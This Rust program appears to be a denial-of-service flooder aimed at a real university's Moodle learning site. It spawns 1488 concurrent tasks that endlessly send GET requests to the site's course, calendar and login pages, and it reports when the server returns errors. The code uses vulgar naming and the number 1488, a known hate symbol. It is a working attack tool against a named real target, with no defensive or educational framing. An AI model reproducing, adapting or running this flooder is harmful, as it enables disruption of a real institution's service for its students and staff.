use reqwest::Client;
use std::sync::Arc;

struct Ebatel {
    urls: Vec<String>,
    client: Client,
}

impl Ebatel {
    fn new() -> Ebatel {
        Ebatel {
            urls: vec![
                "https://dl-hum.spbstu.ru/".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=441".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=445".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=439".to_owned(),
                "https://dl-hum.spbstu.ru/my/".to_owned(),
                "https://dl-hum.spbstu.ru/calendar/view.php?view=month".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=438".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=4".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=333".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=329".to_owned(),
                "https://dl-hum.spbstu.ru/course/index.php?categoryid=328".to_owned(),
                "https://dl-hum.spbstu.ru/login/index.php".to_owned(),
            ],
            client: Client::new(),
        }
    }

    async fn spam(self: Arc<Self>) {
        loop {
            let ind = fastrand::usize(0..self.urls.len());
            let url = self.urls[ind].clone();
            match self.client.get(url).send().await {
                Ok(res) => {
                    if res.status() == 200 {
                        println!("req was sended");
                    } else if res.status() == 502 || res.status() == 500 {
                        println!("server was fucked down");
                    }
                }
                Err(_) => { /* println!("err: {err}") */ }
            }
        }
    }

    async fn trahat() {
        let mut handles = Vec::new();
        let eba = Arc::new(Self::new());
        for _ in 0..1488 {
            let e = eba.clone();
            handles.push(tokio::spawn(async move { e.spam().await }));
        }

        for handle in handles {
            let _ = handle.await;
        }
    }
}

#[tokio::main]
async fn main() {
    Ebatel::trahat().await;
}
